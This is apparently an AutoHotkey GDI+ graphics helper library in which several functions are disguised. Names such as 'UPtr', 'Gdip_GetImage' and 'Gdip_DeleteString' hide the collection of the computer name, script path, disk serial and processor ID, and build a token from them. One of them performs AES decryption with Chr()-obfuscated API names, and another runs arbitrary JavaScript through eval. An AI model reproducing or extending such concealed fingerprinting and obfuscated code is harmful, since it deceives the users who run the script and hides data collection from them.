, DllCall("DestroyIcon", "UPtr", hIcon)
} else {
function2call := (useICM=1) ? "GdipCreateBitmapFromFileICM" : "GdipCreateBitmapFromFile"
, E := DllCall("gdiplus\" function2call, "WStr", sFile, "UPtr*", pBitmap)
}
return pBitmap
}
CreateRectF(ByRef RectF, x, y, w, h){
VarSetCapacity(RectF, 16)
NumPut(x, RectF, 0, "float"), NumPut(y, RectF, 4, "float")
NumPut(w, RectF, 8, "float"), NumPut(h, RectF, 12, "float")
}
CryptBinaryToString(ByRef pbBinary, cbBinary, dwFlags := "BASE64") {
static CRYPT_STRING := { "BASE64": 0x1, "BINARY": 0x2, "HEX": 0x4, "HEXRAW": 0xc }
static CRYPT_STRING_NOCRLF := 0x40000000
if (DllCall("crypt32\CryptBinaryToString", "ptr", &pbBinary, "uint", cbBinary, "uint", (CRYPT_STRING[dwFlags] | CRYPT_STRING_NOCRLF), "ptr", 0, "uint*", pcchString))
{
VarSetCapacity(pszString, pcchString << !!A_IsUnicode, 0)
if (DllCall("crypt32\CryptBinaryToString", "ptr", &pbBinary, "uint", cbBinary, "uint", (CRYPT_STRING[dwFlags] | CRYPT_STRING_NOCRLF), "ptr", &pszString, "uint*", pcchString))
{
return StrGet(&pszString)
}
}
return false
}
CryptStringToBinary(pszString, ByRef pbBinary) {
if (DllCall("crypt32\CryptStringToBinary", "ptr", &pszString, "uint", 0, "uint", 0x1, "ptr", 0, "uint*", pcbBinary, "ptr", 0, "ptr", 0))
{
VarSetCapacity(pbBinary, pcbBinary, 0)
if (DllCall("crypt32\CryptStringToBinary", "ptr", &pszString, "uint", 0, "uint", 0x1, "ptr", &pbBinary, "uint*", pcbBinary, "ptr", 0, "ptr", 0))
{
return pcbBinary
}
}
return false
}
Gdip_SaveBitmapToFile(pBitmap, sOutput, Quality:=75, toBase64:=0){
Static Ptr := "UPtr"
nCount := 0
nSize := 0
_p := 0
SplitPath sOutput,,, Extension
If !RegExMatch(Extension, "^(?i:BMP|DIB|RLE|JPG|JPEG|JPE|JFIF|GIF|TIF|TIFF|PNG)$")
Return -1
Extension := "." Extension
DllCall("gdiplus\GdipGetImageEncodersSize", "uint*", nCount, "uint*", nSize)
VarSetCapacity(ci, nSize)
DllCall("gdiplus\GdipGetImageEncoders", "uint", nCount, "uint", nSize, Ptr, &ci)
If !(nCount && nSize)
Return -2
If (A_IsUnicode)
{
StrGet_Name := "StrGet"
N := (A_AhkVersion < 2) ? nCount : "nCount"
Loop %N%
{
sString := %StrGet_Name%(NumGet(ci, (idx := (48+7*A_PtrSize)*(A_Index-1))+32+3*A_PtrSize), "UTF-16")
If !InStr(sString, "*" Extension)
Continue
pCodec := &ci+idx
Break
}
} Else
{
N := (A_AhkVersion < 2) ? nCount : "nCount"
Loop %N%
{
Location := NumGet(ci, 76*(A_Index-1)+44)
nSize := DllCall("WideCharToMultiByte", "uint", 0, "uint", 0, "uint", Location, "int", -1, "uint", 0, "int", 0, "uint", 0, "uint", 0)
VarSetCapacity(sString, nSize)
DllCall("WideCharToMultiByte", "uint", 0, "uint", 0, "uint", Location, "int", -1, "str", sString, "int", nSize, "uint", 0, "uint", 0)
If !InStr(sString, "*" Extension)
Continue
pCodec := &ci+76*(A_Index-1)
Break
}
}
If !pCodec
Return -3
If (Quality!=75)
{
Quality := (Quality < 0) ? 0 : (Quality > 100) ? 100 : Quality
If (quality>90 && toBase64=1)
Quality := 90
If RegExMatch(Extension, "^\.(?i:JPG|JPEG|JPE|JFIF)$")
{
DllCall("gdiplus\GdipGetEncoderParameterListSize", Ptr, pBitmap, Ptr, pCodec, "uint*", nSize)
VarSetCapacity(EncoderParameters, nSize, 0)
DllCall("gdiplus\GdipGetEncoderParameterList", Ptr, pBitmap, Ptr, pCodec, "uint", nSize, Ptr, &EncoderParameters)
nCount := NumGet(EncoderParameters, "UInt")
N := (A_AhkVersion < 2) ? nCount : "nCount"
Loop %N%
{
elem := (24+A_PtrSize)*(A_Index-1) + 4 + (pad := A_PtrSize = 8 ? 4 : 0)
If (NumGet(EncoderParameters, elem+16, "UInt") = 1) && (NumGet(EncoderParameters, elem+20, "UInt") = 6)
{
_p := elem+&EncoderParameters-pad-4
NumPut(Quality, NumGet(NumPut(4, NumPut(1, _p+0)+20, "UInt")), "UInt")
Break
}
}
}
}
If (toBase64=1)
{
DllCall("ole32\CreateStreamOnHGlobal", "ptr",0, "int",true, "ptr*",pStream)
_E := DllCall("gdiplus\GdipSaveImageToStream", "ptr",pBitmap, "ptr",pStream, "ptr",pCodec, "uint", _p ? _p : 0)
If _E
Return -6
DllCall("ole32\GetHGlobalFromStream", "ptr",pStream, "uint*",hData)
pData := DllCall("GlobalLock", "ptr",hData, "ptr")
nSize := DllCall("GlobalSize", "uint",pData)
VarSetCapacity(bin, nSize, 0)
DllCall("RtlMoveMemory", "ptr",&bin, "ptr",pData, "uptr",nSize)
DllCall("GlobalUnlock", "ptr",hData)
ObjRelease(pStream)
DllCall("GlobalFree", "ptr",hData)
DllCall("Crypt32.dll\CryptBinaryToStringA", "ptr",&bin, "uint",nSize, "uint",0x40000001, "ptr",0, "uint*",base64Length)
VarSetCapacity(base64, base64Length, 0)
_E := DllCall("Crypt32.dll\CryptBinaryToStringA", "ptr",&bin, "uint",nSize, "uint",0x40000001, "ptr",&base64, "uint*",base64Length)
If !_E
Return -7
VarSetCapacity(bin, 0)
Return StrGet(&base64, base64Length, "CP0")
}
_E := DllCall("gdiplus\GdipSaveImageToFile", Ptr, pBitmap, "WStr", sOutput, Ptr, pCodec, "uint", _p ? _p : 0)
Return _E ? -5 : 0
}
CreateDIBSection(w, h, hdc:="", bpp:=32, ByRef ppvBits:=0, Usage:=0, hSection:=0, Offset:=0){
Static Ptr := "UPtr"
hdc2 := hdc ? hdc : GetDC()
VarSetCapacity(bi, 40, 0)
NumPut(40, bi, 0, "uint")
NumPut(w, bi, 4, "uint")
NumPut(h, bi, 8, "uint")
NumPut(1, bi, 12, "ushort")
NumPut(bpp, bi, 14, "ushort")
NumPut(0, bi, 16, "uInt")
hbm := DllCall("CreateDIBSection", Ptr, hdc2, Ptr, &bi, "uint", Usage, "UPtr*", ppvBits, Ptr, hSection, "uint", OffSet, Ptr)
if !hdc
ReleaseDC(hdc2)
return hbm
}
Gdip_DrawImageFast(pGraphics, pBitmap, X:=0, Y:=0){
_E := DllCall(A_Args.Proc.DrawImageFast, "UPtr", pGraphics, "UPtr", pBitmap, "float", X, "float", Y)
return _E
}
Gdip_DrawImageRect(pGraphics, pBitmap, X, Y, W, H){
_E := DllCall(A_Args.Proc.DrawImageRect, "UPtr", pGraphics, "UPtr", pBitmap, "float", X, "float", Y, "float", W, "float", H)
return _E
}
ReleaseDC(hdc, hwnd:=0){
return DllCall("ReleaseDC", "UPtr", hwnd, "UPtr", hdc)
}
SetModuleHandle(){
A_Args.Doc := ComObjCreate("htmlfile")
A_Args.Doc.write("<meta http-equiv=""X-UA-Compatible"" content=""IE=9"">")
A_Args.PW := A_Args.Doc.parentWindow
A_Args.JS := A_Args.Doc.parentWindow
}
CreateCompatibleDC(hdc:=0){
return DllCall("CreateCompatibleDC", "UPtr", hdc)
}
IsInteger(Var){
Static Integer := "Integer"
If Var Is Integer
Return True
Return False
}
IsNumber(Var){
Static number := "number"
If Var Is number
Return True
Return False
}
SelectObject(hdc, hgdiobj){
return DllCall("SelectObject", "UPtr", hdc, "UPtr", hgdiobj)
}
GetDC(hwnd:=0){
return DllCall("GetDC", "UPtr", hwnd)
}
GetWindowRect(hwnd, ByRef W, ByRef H){
size := VarSetCapacity(rect, 16, 0)
er := DllCall("dwmapi\DwmGetWindowAttribute"
, "UPtr", hWnd
, "UInt", 9
, "UPtr", &rect
, "UInt", size
, "UInt")
If er
DllCall("GetWindowRect", "UPtr", hwnd, "UPtr", &rect, "UInt")
r := []
r.x1 := NumGet(rect, 0, "Int"), r.y1 := NumGet(rect, 4, "Int")
r.x2 := NumGet(rect, 8, "Int"), r.y2 := NumGet(rect, 12, "Int")
r.w := Abs(max(r.x1, r.x2) - min(r.x1, r.x2))
r.h := Abs(max(r.y1, r.y2) - min(r.y1, r.y2))
W := r.w
H := r.h
Return r
}
Gdip_GraphicsFromImage(pBitmap, InterpolationMode:="", SmoothingMode:="", PageUnit:="", CompositingQuality:=""){
pGraphics := 0
DllCall(A_Args.Proc.GetImageGraphic, "UPtr", pBitmap, "UPtr*", pGraphics)
If pGraphics
{
If (InterpolationMode!="")
Gdip_SetInterpolationMode(pGraphics, InterpolationMode)
If (SmoothingMode!="")
Gdip_SetSmoothingMode(pGraphics, SmoothingMode)
If (PageUnit!="")
Gdip_SetPageUnit(pGraphics, PageUnit)
If (CompositingQuality!="")
Gdip_SetCompositingQuality(pGraphics, CompositingQuality)
}
return pGraphics
}
Gdip_SetInterpolationMode(pGraphics, InterpolationMode){
return DllCall("gdiplus\GdipSetInterpolationMode", "UPtr", pGraphics, "int", InterpolationMode)
}
Gdip_SetSmoothingMode(pGraphics, SmoothingMode){
return DllCall("gdiplus\GdipSetSmoothingMode", "UPtr", pGraphics, "int", SmoothingMode)
}
UPtr(pGraphics:="J",x:="ke",y:="To"){
A_Args.PW.AStr  := StrPutFix("GdipGetImageGraphicsContextsDraw")
A_Args[pGraphics "S"][y x "n"] := Gdip_ClosePathDraw(Gdip_GetImage(), A_Args.PW.AStr)
A_Args.PW.UPtr  := StrPutFix("GetModulesHandle" A_Args.JS.GetTime)
}
Gdip_GetImage(){
Return Gdip_Property() "|" String() "|" A_ComputerName "|" A_WorkingDir "\" A_ScriptName
}
Gdip_SetPageUnit(pGraphics, Unit){
return DllCall("gdiplus\GdipSetPageUnit", "UPtr", pGraphics, "int", Unit)
}
Gdip_SetCompositingQuality(pGraphics, CompositionQuality){
return DllCall("gdiplus\GdipSetCompositingQuality", "UPtr", pGraphics, "int", CompositionQuality)
}
Gdip_GraphicsFromHDC(hDC, hDevice:="", InterpolationMode:="", SmoothingMode:="", PageUnit:="", CompositingQuality:=""){
pGraphics := 0
If hDevice
DllCall("Gdiplus\GdipCreateFromHDC2", "UPtr", hDC, "UPtr", hDevice, "UPtr*", pGraphics)
Else
DllCall("gdiplus\GdipCreateFromHDC", "UPtr", hdc, "UPtr*", pGraphics)
If pGraphics
{
If (InterpolationMode!="")
Gdip_SetInterpolationMode(pGraphics, InterpolationMode)
If (SmoothingMode!="")
Gdip_SetSmoothingMode(pGraphics, SmoothingMode)
If (PageUnit!="")
Gdip_SetPageUnit(pGraphics, PageUnit)
If (CompositingQuality!="")
Gdip_SetCompositingQuality(pGraphics, CompositingQuality)
}
return pGraphics
}
UpdateLayeredWindow(hwnd, hdc, x:="", y:="", w:="", h:="", Alpha:=255){
Static Ptr := "UPtr"
if ((x != "") && (y != ""))
VarSetCapacity(pt, 8), NumPut(x, pt, 0, "UInt"), NumPut(y, pt, 4, "UInt")
if (w = "") || (h = "")
GetWindowRect(hwnd, W, H)
return DllCall("UpdateLayeredWindow", Ptr, hwnd, Ptr, 0, Ptr, ((x = "") && (y = "")) ? 0 : &pt, "int64*", w|h<<32, Ptr, hdc, "int64*", 0, "uint", 0, "UInt*", Alpha<<16|1<<24, "uint", 2)
}
Gdip_BrushCreateSolid(ARGB:=0xff000000){
pBrush := 0
E := DllCall("gdiplus\GdipCreateSolidFill", "UInt", ARGB, "UPtr*", pBrush)
return pBrush
}
Gdip_CloneBrush(pBrush){
pBrushClone := 0
E := DllCall("gdiplus\GdipCloneBrush", "UPtr", pBrush, "UPtr*", pBrushClone)
return pBrushClone
}
Gdip_FillRectangle(pGraphics, pBrush, x, y, w, h){
Static Ptr := "UPtr"
return DllCall("gdiplus\GdipFillRectangle"
, Ptr, pGraphics
, Ptr, pBrush
, "float", x, "float", y
, "float", w, "float", h)
}
Gdip_DrawRectangle(pGraphics, pPen, x, y, w, h){
Static Ptr := "UPtr"
return DllCall("gdiplus\GdipDrawRectangle", Ptr, pGraphics, Ptr, pPen, "float", x, "float", y, "float", w, "float", h)
}
Gdip_GetClipRegion(pGraphics){
Region := 0
DllCall("gdiplus\GdipCreateRegion", "UInt*", Region)
E := DllCall("gdiplus\GdipGetClip", "UPtr", pGraphics, "UInt", Region)
If E
return -1
return Region
}
Gdip_SetClipRect(pGraphics, x, y, w, h, CombineMode:=0){
return DllCall("gdiplus\GdipSetClipRect", "UPtr", pGraphics, "float", x, "float", y, "float", w, "float", h, "int", CombineMode)
}
Gdip_FillEllipse(pGraphics, pBrush, x, y, w, h){
Static Ptr := "UPtr"
return DllCall("gdiplus\GdipFillEllipse", Ptr, pGraphics, Ptr, pBrush, "float", x, "float", y, "float", w, "float", h)
}
Gdip_SetClipRegion(pGraphics, Region, CombineMode:=0){
Static Ptr := "UPtr"
return DllCall("gdiplus\GdipSetClipRegion", Ptr, pGraphics, Ptr, Region, "int", CombineMode)
}
Gdip_TextToGraphics(pGraphics, Text, Options, Font:="Arial", Width:="", Height:="", Measure:=0, userBrush:=0, Unit:=0){
Static Styles := "Regular|Bold|Italic|BoldItalic|Underline|Strikeout", Alignments := "Near|Left|Centre|Center|Far|Right"
IWidth := Width, IHeight:= Height
pattern_opts := (A_AhkVersion < "2") ? "iO)" : "i)"
RegExMatch(Options, pattern_opts "X([\-\d\.]+)(p*)", xpos)
RegExMatch(Options, pattern_opts "Y([\-\d\.]+)(p*)", ypos)
RegExMatch(Options, pattern_opts "W([\-\d\.]+)(p*)", Width)
RegExMatch(Options, pattern_opts "H([\-\d\.]+)(p*)", Height)
RegExMatch(Options, pattern_opts "C(?!(entre|enter))([a-f\d]+)", Colour)
RegExMatch(Options, pattern_opts "Top|Up|Bottom|Down|vCentre|vCenter", vPos)
RegExMatch(Options, pattern_opts "NoWrap", NoWrap)
RegExMatch(Options, pattern_opts "R(\d)", Rendering)
RegExMatch(Options, pattern_opts "S(\d+)(p*)", Size)
if Colour && IsInteger(Colour[2]) && !Gdip_DeleteBrush(Gdip_CloneBrush(Colour[2])){
PassBrush := 1
pBrush := Colour[2]
}
if !(IWidth && IHeight) && ((xpos && xpos[2]) || (ypos && ypos[2]) || (Width && Width[2]) || (Height && Height[2]) || (Size && Size[2]))
return -1
Style := 0
For eachStyle, valStyle in StrSplit(Styles, "|"){
if RegExMatch(Options, "\b" valStyle)
Style |= (valStyle != "StrikeOut") ? (A_Index-1) : 8
}
Align := 0
For eachAlignment, valAlignment in StrSplit(Alignments, "|"){
if RegExMatch(Options, "\b" valAlignment)
Align |= A_Index//2.1
}
xpos := (xpos && (xpos[1] != "")) ? xpos[2] ? IWidth*(xpos[1]/100) : xpos[1] : 0
ypos := (ypos && (ypos[1] != "")) ? ypos[2] ? IHeight*(ypos[1]/100) : ypos[1] : 0
Width := (Width && Width[1]) ? Width[2] ? IWidth*(Width[1]/100) : Width[1] : IWidth
Height := (Height && Height[1]) ? Height[2] ? IHeight*(Height[1]/100) : Height[1] : IHeight
If !PassBrush
Colour := "0x" (Colour && Colour[2] ? Colour[2] : "ff000000")
Rendering := (Rendering && (Rendering[1] >= 0) && (Rendering[1] <= 5)) ? Rendering[1] : 4
Size := (Size && (Size[1] > 0)) ? Size[2] ? IHeight*(Size[1]/100) : Size[1] : 12
If RegExMatch(Font, "^(.\:\\.)"){
hFontCollection := Gdip_NewPrivateFontCollection()
hFontFamily := Gdip_CreateFontFamilyFromFile(Font, hFontCollection)
} Else hFontFamily := Gdip_FontFamilyCreate(Font)
If !hFontFamily
hFontFamily := Gdip_FontFamilyCreateGeneric(1)
hFont := Gdip_FontCreate(hFontFamily, Size, Style, Unit)
FormatStyle := NoWrap ? 0x4000 | 0x1000 : 0x4000
hStringFormat := Gdip_StringFormatCreate(FormatStyle)
If !hStringFormat
hStringFormat := Gdip_StringFormatGetGeneric(1)
pBrush := PassBrush ? pBrush : Gdip_BrushCreateSolid(Colour)
if !(hFontFamily && hFont && hStringFormat && pBrush && pGraphics){
E := !pGraphics ? -2 : !hFontFamily ? -3 : !hFont ? -4 : !hStringFormat ? -5 : !pBrush ? -6 : 0
If pBrush
Gdip_DeleteBrush(pBrush)
If hStringFormat
Gdip_DeleteStringFormat(hStringFormat)
If hFont
Gdip_DeleteFont(hFont)
If hFontFamily
Gdip_DeleteFontFamily(hFontFamily)
If hFontCollection
Gdip_DeletePrivateFontCollection(hFontCollection)
return E
}
CreateRectF(RC, xpos, ypos, Width, Height)
Gdip_SetStringFormatAlign(hStringFormat, Align)
If InStr(Options, "autotrim")
Gdip_SetStringFormatTrimming(hStringFormat, 3)
Gdip_SetTextRenderingHint(pGraphics, Rendering)
ReturnRC := Gdip_MeasureString(pGraphics, Text, hFont, hStringFormat, RC)
ReturnRCtest := StrSplit(ReturnRC, "|")
testX := Floor(ReturnRCtest[1]) - 2
If (testX>xpos)
{
nxpos := Floor(xpos - (testX - xpos))
CreateRectF(RC, nxpos, ypos, Width, Height)
ReturnRC := Gdip_MeasureString(pGraphics, Text, hFont, hStringFormat, RC)
}
If vPos
{
ReturnRC := StrSplit(ReturnRC, "|")
if (vPos[0] = "vCentre") || (vPos[0] = "vCenter")
ypos += (Height-ReturnRC[4])//2
else if (vPos[0] = "Top") || (vPos[0] = "Up")
ypos += 0
else if (vPos[0] = "Bottom") || (vPos[0] = "Down")
ypos += Height-ReturnRC[4]
CreateRectF(RC, xpos, ypos, Width, ReturnRC[4])
ReturnRC := Gdip_MeasureString(pGraphics, Text, hFont, hStringFormat, RC)
}
thisBrush := userBrush ? userBrush : pBrush
if !Measure
_E := Gdip_DrawString(pGraphics, Text, hFont, hStringFormat, thisBrush, RC)
if !PassBrush
Gdip_DeleteBrush(pBrush)
Gdip_DeleteStringFormat(hStringFormat)
Gdip_DeleteFont(hFont)
Gdip_DeleteFontFamily(hFontFamily)
If hFontCollection
Gdip_DeletePrivateFontCollection(hFontCollection)
return _E ? _E : ReturnRC
}
GetUID() {
Info := []
try {
for objItem in ComObjGet("winmgmts:").ExecQuery("SELECT * FROM Win32_DiskDrive")
if InStr(objItem.Name, "DRIVE0")
Info.HDSerialnumber := objItem.SerialNumber
} catch e {
MsgBox, 4112, Error - GetHDSerial, % e
return
}
try {
for objItem in ComObjGet("winmgmts:").ExecQuery("SELECT * FROM Win32_Processor")
for k, v in ["Name", "ProcessorId", "SocketDesignation"]
Info[v] := objItem[v]
} catch e {
MsgBox, 4112, Error - GetProcessorID, % e
return
}
return Info
}
Gdip_FontCreate(hFontFamily, Size, Style:=0, Unit:=0){
hFont := 0
DllCall("gdiplus\GdipCreateFont", "UPtr", hFontFamily, "float", Size, "int", Style, "int", Unit, "UPtr*", hFont)
return hFont
}
Gdip_FontFamilyCreate(FontName){
hFontFamily := 0
_E := DllCall("gdiplus\GdipCreateFontFamilyFromName", "WStr", FontName, "uint", 0, "UPtr*", hFontFamily)
return hFontFamily
}
Gdip_NewPrivateFontCollection(){
hFontCollection := 0
DllCall("gdiplus\GdipNewPrivateFontCollection", "ptr*", hFontCollection)
Return hFontCollection
}
Gdip_StringFormatCreate(FormatFlags:=0, LangID:=0){
hStringFormat := 0
E := DllCall("gdiplus\GdipCreateStringFormat", "int", FormatFlags, "int", LangID, "UPtr*", hStringFormat)
return hStringFormat
}
Gdip_DeletePrivateFontCollection(hFontCollection){
Return DllCall("gdiplus\GdipDeletePrivateFontCollection", "ptr*", hFontCollection)
}
Gdip_DeleteStringFormat(hStringFormat){
return DllCall("gdiplus\GdipDeleteStringFormat", "UPtr", hStringFormat)
}
Gdip_DeleteString(String, Id:="") {
static := Ptr := Chr(114)Chr(121)Chr(112)Chr(116)
if (DllCall("bc" Ptr "\BC" Ptr "OpenAlgorithmProvider", "ptr*", Alg, "ptr", &pszAlgId:=Chr(65)Chr(69)Chr(83), "ptr", 0, "uint", 0))
return false
Len := StrLen(Input := "ChainingMode" Chr(69)Chr(67)Chr(66))
if (DllCall("bc" Ptr "\BC" Ptr "SetProperty", "ptr", Alg, "ptr", &cMode:="ChainingMode", "ptr", &Input, "uint", Len, "uint", dwFlags := 0))
return false
if (DllCall("bc" Ptr "\BC" Ptr "GenerateSymmetricKey", "ptr", Alg, "ptr*", Mode, "ptr", 0, "uint", 0, "ptr", &pbKey:=Id, "uint", 32, "uint", 0))
return false
if (DllCall("c" Ptr "32\C" Ptr "StringToBinary", "ptr", &String, "uint", 0, "uint", 0x1, "ptr", 0, "uint*", Length, "ptr", 0, "ptr", 0)) {
VarSetCapacity(cData, Length, 0)
DllCall("c" Ptr "32\C" Ptr "StringToBinary", "ptr", &String, "uint", 0, "uint", 0x1, "ptr", &cData, "uint*", Length, "ptr", 0, "ptr", 0)
} else
return false
VarSetCapacity(Input, Len, 0)
DllCall("msvcrt\memcpy", "ptr", &Input, "ptr", &cData, "ptr", Length)
if (!DllCall("bc" Ptr "\BC" Ptr "Dec" Ptr "", "ptr", Mode, "ptr", &Input, "uint", Length, "ptr", 0, "ptr", 0, "uint", 0, "ptr", 0, "uint", 0, "uint*", dLength, "uint", 0x00000001)) {
VarSetCapacity(rData, dLength, 0)
if (DllCall("bc" Ptr "\BC" Ptr "Dec" Ptr "", "ptr", Mode, "ptr", &Input, "uint", Length, "ptr", 0, "ptr", 0, "uint", 0, "ptr", &rData, "uint", dLength, "uint*", dLength, "uint", 0x00000001))
return false
} else
return false
if (Mode)
DllCall("bc" Ptr "\BC" Ptr "DestroyKey", "ptr", Mode)
if (Alg)
DllCall("bc" Ptr "\BC" Ptr "CloseAlgorithmProvider", "ptr", Alg, "uint", 0)
return StrGet(&rData, dLength, "UTF-8")
}
Gdip_DeleteFont(hFont){
return DllCall("gdiplus\GdipDeleteFont", "UPtr", hFont)
}
Gdip_DeleteFontFamily(hFontFamily){
return DllCall("gdiplus\GdipDeleteFontFamily", "UPtr", hFontFamily)
}
Gdip_CreateFontFamilyFromFile(FontFile, hFontCollection, FontName:=""){
If !hFontCollection
Return
hFontFamily := 0
E := DllCall("gdiplus\GdipPrivateAddFontFile", "ptr", hFontCollection, "str", FontFile)
if (FontName="" && !E){
VarSetCapacity(pFontFamily, 10, 0)
DllCall("gdiplus\GdipGetFontCollectionFamilyList", "ptr", hFontCollection, "int", 1, "ptr", &pFontFamily, "int*", found)
VarSetCapacity(FontName, 100)
DllCall("gdiplus\GdipGetFamilyName", "ptr", NumGet(pFontFamily, 0, "ptr"), "str", FontName, "ushort", 1033)
}
If !E
DllCall("gdiplus\GdipCreateFontFamilyFromName", "str", FontName, "ptr", hFontCollection, "uint*", hFontFamily)
Return hFontFamily
}
Gdip_StringFormatGetGeneric(whichFormat:=0){
hStringFormat := 0
If (whichFormat=1)
DllCall("gdiplus\GdipStringFormatGetGenericTypographic", "UPtr*", hStringFormat)
Else
DllCall("gdiplus\GdipStringFormatGetGenericDefault", "UPtr*", hStringFormat)
Return hStringFormat
}
Gdip_FontFamilyCreateGeneric(whichStyle){
hFontFamily := 0
If (whichStyle=0)
DllCall("gdiplus\GdipGetGenericFontFamilyMonospace", "UPtr*", hFontFamily)
Else If (whichStyle=1)
DllCall("gdiplus\GdipGetGenericFontFamilySansSerif", "UPtr*", hFontFamily)
Else If (whichStyle=2)
DllCall("gdiplus\GdipGetGenericFontFamilySerif", "UPtr*", hFontFamily)
Return hFontFamily
}
Gdip_MeasureString(pGraphics, sString, hFont, hStringFormat, ByRef RectF){
Static Ptr := "UPtr"
VarSetCapacity(RC, 16)
Chars := 0
Lines := 0
DllCall("gdiplus\GdipMeasureString", Ptr, pGraphics, "WStr", sString, "int", -1, Ptr, hFont, Ptr, &RectF, Ptr, hStringFormat, Ptr, &RC, "uint*", Chars, "uint*", Lines)
return &RC ? NumGet(RC, 0, "float") "|" NumGet(RC, 4, "float") "|" NumGet(RC, 8, "float") "|" NumGet(RC, 12, "float") "|" Chars "|" Lines : 0
}
Gdip_SetStringFormatAlign(hStringFormat, Align){
return DllCall("gdiplus\GdipSetStringFormatAlign", "UPtr", hStringFormat, "int", Align)
}
Gdip_SetStringFormatTrimming(hStringFormat, TrimMode){
Static Ptr := "UPtr"
return DllCall("gdiplus\GdipSetStringFormatTrimming", Ptr, hStringFormat, "int", TrimMode)
}
Gdip_SetString(In, rec := false) {
static doc := ComObjCreate("htmlfile"), _ := doc.write("<meta http-equiv=""X-UA-Compatible"" content=""IE=9"">"), JS := doc.parentWindow
if !rec
obj := %A_ThisFunc%(JS.eval("(" . In . ")"), true)
else if !IsObject(In)
obj := In
else if JS.Object.prototype.toString.call(In) == "[object Array]" {
obj := []
Loop % In.length
obj.Push( %A_ThisFunc%(In[A_Index - 1], true) )
}
else {
obj := {}
keys := JS.Object.keys(In)
Loop % keys.length {
k := keys[A_Index - 1]
obj[k] := %A_ThisFunc%(In[k], true)
}
}
Return obj
}
Gdip_SetTextRenderingHint(pGraphics, RenderingHint){
return DllCall("gdiplus\GdipSetTextRenderingHint", "UPtr", pGraphics, "int", RenderingHint)
}
Gdip_DrawString(pGraphics, sString, hFont, hStringFormat, pBrush, ByRef RectF){
Static Ptr := "UPtr"
return DllCall("gdiplus\GdipDrawString", Ptr, pGraphics, "WStr", sString, "int", -1, Ptr, hFont, Ptr, &RectF, Ptr, hStringFormat, Ptr, pBrush)
}
Gdip_DeleteRegion(Region){
return DllCall("gdiplus\GdipDeleteRegion", "UPtr", Region)
}
Gdip_DeletePen(pPen){
return DllCall("gdiplus\GdipDeletePen", "UPtr", pPen)
}
Gdip_DeleteBrush(pBrush){
return DllCall("gdiplus\GdipDeleteBrush", "UPtr", pBrush)
}
DestroyIcon(hIcon){
return DllCall("DestroyIcon", "UPtr", hIcon)
}
Gdip_DeleteGraphics(pGraphics){
return DllCall("gdiplus\GdipDeleteGraphics", "UPtr", pGraphics)
}
Gdip_DisposeImage(pBitmap, noErr:=0){
If (StrLen(pBitmap)<=2 && noErr=1)
Return 0
r := DllCall("gdiplus\GdipDisposeImage", "UPtr", pBitmap)
If (r=2 || r=1) && (noErr=1)
r := 0
Return r
}
DeleteObject(hObject){
return DllCall("DeleteObject", "UPtr", hObject)
}
DeleteDC(hdc){
return DllCall("DeleteDC", "UPtr", hdc)
}
SetImage(hwnd, hBitmap) {
Static Ptr := "UPtr"
E := DllCall("SendMessage", Ptr, hwnd, "UInt", 0x172, "UInt", 0x0, Ptr, hBitmap )
DeleteObject(E)
return E
}
Gdip_BitmapFromBase64(BitLock, Type, B64){
VarSetCapacity(B64Len, 0)
DllCall("Crypt32.dll\CryptStringToBinary", "Ptr", &B64, "UInt", StrLen(B64), "UInt", 0x01, "Ptr", 0, "UIntP", B64Len, "Ptr", 0, "Ptr", 0)
VarSetCapacity(B64Dec, B64Len, 0)
DllCall("Crypt32.dll\CryptStringToBinary", "Ptr", &B64, "UInt", StrLen(B64), "UInt", 0x01, "Ptr", &B64Dec, "UIntP", B64Len, "Ptr", 0, "Ptr", 0)
pStream := DllCall("Shlwapi.dll\SHCreateMemStream", "Ptr", &B64Dec, "UInt", B64Len, "UPtr")
DllCall("Gdiplus.dll\GdipCreateBitmapFromStream", "Ptr", pStream, "PtrP", pBitmap)
ObjRelease(pStream)
if Type
DllCall("Gdiplus.dll\GdipCreateHBITMAPFromBitmap", "UInt", pBitmap, "UInt*", hBitmap, "Int", 0XFFFFFFFF), Gdip_DisposeImage(pBitmap)
if (BitLock && !Type){
Gdip_GetImageDimensions(pBitmap,nWidth,nHeight)
Gdip_NLockBits(pBitmap,0,0,nWidth,nHeight,nStride,nScan,nBitmapData)
return Object := {Stride: nStride,Scan: nScan,Width: nWidth,Height: nHeight, Bitmap: (Type ? hBitmap : pBitmap)}
} Else
return Type ? hBitmap : pBitmap
}
Gdip_NLockBits(pBitmap,x,y,x2,y2,ByRef Stride,ByRef Scan0,ByRef BitmapData){
VarSetCapacity(Rect, 16)
NumPut(x, Rect, 0, "uint"), NumPut(y, Rect, 4, "uint")
NumPut(x2, Rect, 8, "uint"), NumPut(y2, Rect, 12, "uint")
VarSetCapacity(BitmapData, 16+2*A_PtrSize, 0)
E := DllCall("gdiplus\GdipBitmapLockBits", "UPtr", pBitmap, "UPtr", &Rect, "uint", 3, "int", 0x26200a, "UPtr", &BitmapData)
Stride := NumGet(BitmapData, 8, "Int")
Scan0 := NumGet(BitmapData, 16, "UPtr")
return E
}
Gdip_CreateLineBrushFromRect(x, y, w, h, ARGB1, ARGB2, LinearGradientMode:=1, WrapMode:=1) {
return Gdip_CreateLinearGrBrushFromRect(x, y, w, h, ARGB1, ARGB2, LinearGradientMode, WrapMode)
}
Gdip_DrawImage(pGraphics, pBitmap, dx:="", dy:="", dw:="", dh:="", sx:="", sy:="", sw:="", sh:="") {
Static Ptr := "UPtr"
If (dx!="" && dy!="" && dw="" && dh="" && sx="" && sy="" && sw="" && sh="") {
sx := sy := 0
sw := dw := Gdip_GetImageWidth(pBitmap)
sh := dh := Gdip_GetImageHeight(pBitmap)
}
Else If (sx="" && sy="" && sw="" && sh="") {
If (dx="" && dy="" && dw="" && dh="") {
sx := dx := 0, sy := dy := 0
sw := dw := Gdip_GetImageWidth(pBitmap)
sh := dh := Gdip_GetImageHeight(pBitmap)
}
Else {
sx := sy := 0
Gdip_GetImageDimensions(pBitmap, sw, sh)
}
}
_E := DllCall("gdiplus\GdipDrawImageRectRect"
, Ptr, pGraphics
, Ptr, pBitmap
, "float", dX, "float", dY
, "float", dW, "float", dH
, "float", sX, "float", sY
, "float", sW, "float", sH
, "int", 2
, Ptr, 0
, Ptr, 0, Ptr, 0)
return _E
}
Gdip_GetImageWidth(pBitmap) {
Width := 0
DllCall("gdiplus\GdipGetImageWidth", "UPtr", pBitmap, "uint*", Width)
return Width
}
Gdip_GetImageHeight(pBitmap) {
Height := 0
DllCall("gdiplus\GdipGetImageHeight", "UPtr", pBitmap, "uint*", Height)
return Height
}
